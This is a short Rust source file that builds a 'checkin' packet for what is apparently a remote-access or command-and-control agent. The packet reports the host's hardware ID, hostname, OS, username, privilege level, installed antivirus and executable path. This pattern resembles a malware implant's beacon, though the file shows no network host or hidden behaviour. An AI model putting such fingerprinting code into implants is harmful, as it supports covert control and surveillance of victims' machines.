use oxide_shared::packet::Packet;
use crate::platform;

pub fn build_checkin_packet() -> Packet {
    let info = platform::gather_system_info();
    Packet::new("checkin", serde_json::json!({
        "hwid": info.hwid,
        "hostname": info.hostname,
        "os": info.os,
        "arch": info.arch,
        "username": info.username,
        "privileges": info.privileges,
        "av": info.av,
        "exe_path": info.exe_path,
        "version": oxide_shared::constants::VERSION,
    }))
}
